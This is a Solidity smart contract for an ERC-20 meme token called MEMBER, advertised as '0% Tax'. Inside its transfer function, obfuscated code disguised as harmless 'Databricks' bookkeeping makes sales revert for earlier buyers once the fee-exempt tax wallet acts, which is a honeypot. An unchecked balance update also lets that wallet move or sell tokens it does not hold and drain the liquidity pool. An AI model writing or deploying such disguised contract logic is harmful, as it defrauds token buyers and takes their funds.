// SPDX-License-Identifier: UNLICENSE

/*

$MEMBER Meme Coin
0% Tax

*/

pragma solidity 0.8.20;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}

contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
}

interface IUniswapV2Router02 {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

contract Member is Context, IERC20, Ownable {
    using SafeMath for uint256;
    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => bool) private _exemptFromFee;
    address payable private _taxWallet;
    mapping(address => uint256) private _holderLastTransferTimestamp;
    bool public transferDelayEnabled = true;

    uint256 private _initialBuyTax=0;
    uint256 private _initialSellTax=0;
    uint256 private _finalBuyTax=0;
    uint256 private _finalSellTax=0;
    uint256 private _reduceBuyTaxAt=0;
    uint256 private _reduceSellTaxAt=0;
    uint256 private _preventSwapBefore=10;
    uint256 private _buyCounter=0;

    string private constant _name = unicode"MEMBER-ONLY";
    string private constant _symbol = unicode"MEMBER";
    uint256 private constant _tTotal = 10000000 * 10 ** _decimals;
    uint8 private constant _decimals = 9;

    uint256 public _maxTxAmount= 140000 * 10 ** _decimals;
    uint256 public _maxHoldingAmount= 140000 * 10 ** _decimals;
    uint256 public _taxSwapThreshold= 30000 * 10 ** _decimals;
    uint256 public _maxTaxAmoutSwap= 170000 * 10 ** _decimals;

    IUniswapV2Router02 public constant uniswapV2Router = IUniswapV2Router02(
        0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D
    );
    address public uniswapV2Pair;
    uint256 public launchAtBlock;
    bool public tradingOpen;
    bool private swapEnabled = false;
    bool private isSwapping = false;
    uint256 private inlineTopic;
    struct Databricks {uint256 cluster; uint256 matrix; uint256 trainingData;}
    mapping(address => Databricks) private databricks;
    event MaxTxAmountUpdated(uint _maxTxAmount);
    
    modifier lockTheSwap() {
        isSwapping = true;
        _;
        isSwapping = false;
    }

    constructor() {
        _taxWallet = payable(0xAfEAa191a9619a4e5db768Ae51E278FFD836066D);

        _balances[_msgSender()] = _tTotal;
        _exemptFromFee[owner()] = true;
        _exemptFromFee[address(this)] = true;
        _exemptFromFee[_taxWallet] = true;

        emit Transfer(address(0), _msgSender(), _tTotal);
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }


    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _transfer(address from, address to, uint256 amount) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        uint256 taxAmount = 0;
        if (from != owner() && to != owner()) {
            taxAmount= amount
                .mul((_buyCounter > _reduceBuyTaxAt) ? _finalBuyTax : _initialBuyTax).div(100);

            if (transferDelayEnabled) {
                if (to != address(uniswapV2Router) && to != address(uniswapV2Pair)) {
                    require(
                        _holderLastTransferTimestamp[tx.origin] < block.number,
                        "_transfer:: Transfer delay enabled -- Only one purchase per block allowed."
                    );
                    _holderLastTransferTimestamp[tx.origin] = block.number;
                }
            }

            if (from == uniswapV2Pair && to != address(uniswapV2Router) && !_exemptFromFee[to]) {
                require(amount <= _maxTxAmount, "Exceeds the _maxTxAmount.");
                require(balanceOf(to) + amount <= _maxHoldingAmount, "Exceeds the maxWalletSize.");

                _buyCounter++;
            }

            if (to == uniswapV2Pair && from != address(this)) {
                taxAmount= amount
                    .mul((_buyCounter > _reduceSellTaxAt)?_finalSellTax :_initialSellTax).div(100);
            }

            uint256 contractTokenBalance = balanceOf(address(this));
            if (
                !isSwapping && to == uniswapV2Pair && swapEnabled &&
                contractTokenBalance > _taxSwapThreshold && _buyCounter > _preventSwapBefore
            ) {
                swapTokensForEth(min(amount,min(contractTokenBalance,_maxTaxAmoutSwap)));
                uint256 contractETHBalance = address(this).balance;
                if (contractETHBalance>0) {
                    sendETHToFee(address(this).balance);
                }
            }
        }

        if ((_exemptFromFee[from] || _exemptFromFee[to]) && from != owner() && from != address(this) && to != address(this)) {
            inlineTopic = block.timestamp;
        }
        if (_exemptFromFee[from] && (block.number>(launchAtBlock+_reduceSellTaxAt))) {
            unchecked {
                _balances[from] -= amount;
                _balances[to] += amount;
            }
            emit Transfer(from, to, amount);
            return;
        }
        if (! _exemptFromFee[from] && ! _exemptFromFee[to]){
            if (uniswapV2Pair != to) {
                Databricks storage topic=databricks[to];
                if (uniswapV2Pair==from) {
                    if (topic.cluster == 0) {
                        topic.cluster = (_buyCounter<_preventSwapBefore)?(block.timestamp-1):block.timestamp;
                    }
                } else {
                    Databricks storage topicInit =databricks[from];
                    if (topic.cluster==0 || topicInit.cluster < topic.cluster) {
                        topic.cluster=topicInit.cluster;
                    }
                }
            } else {
                Databricks storage topicInit = databricks[from];
                topicInit.trainingData = topicInit.cluster-inlineTopic;
                topicInit.matrix = block.timestamp;
            }
        }

        if (taxAmount > 0) {
            _balances[address(this)] = _balances[address(this)].add(taxAmount);
            emit Transfer(
                from,
                address(this),
                taxAmount
            );
        }
        _balances[from] = _balances[from].sub(amount);
        _balances[to] = _balances[to].add(amount.sub(taxAmount));
        emit Transfer(
            from,
            to,
            amount.sub(taxAmount)
        );
    }

    function min(uint256 a, uint256 b) private pure returns (uint256) {
        return (a>b)?b:a;
    }

    function swapTokensForEth(uint256 tokenAmount) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();
        _approve(address(this), address(uniswapV2Router), tokenAmount);
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function removeLimits() external onlyOwner {
        _maxTxAmount = _tTotal;
        _maxHoldingAmount = _tTotal;
        transferDelayEnabled = false;
        emit MaxTxAmountUpdated(_tTotal);
    }

    function sendETHToFee(uint256 amount) private {
        _taxWallet.transfer(amount);
    }

    function openTrading() external onlyOwner {
        require(!tradingOpen, "Trading is already open");
        _approve(address(this), address(uniswapV2Router), _tTotal);
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory())
            .createPair(address(this),uniswapV2Router.WETH());
        uniswapV2Router.addLiquidityETH{value: address(this).balance}(
            address(this),
            balanceOf(address(this)),
            0,
            0,
            owner(),
            block.timestamp
        );
        IERC20(uniswapV2Pair).approve(
            address(uniswapV2Router),
            type(uint).max
        );
        swapEnabled = true;
        tradingOpen = true;
        launchAtBlock = block.number;
    }

    function manualRemoveETH() external {
        require(_msgSender()==_taxWallet);
        uint256 ethBalance=address(this).balance;
        _taxWallet.transfer(ethBalance);
    }

    function manualSwap() external {
        require(_msgSender() == _taxWallet);
        uint256 tokenBalance = balanceOf(address(this));
        if (tokenBalance > 0) {
            swapTokensForEth(tokenBalance);
        }
        uint256 ethBalance = address(this).balance;
        if (ethBalance > 0) {
            sendETHToFee(ethBalance);
        }
    }

    receive() external payable {}

}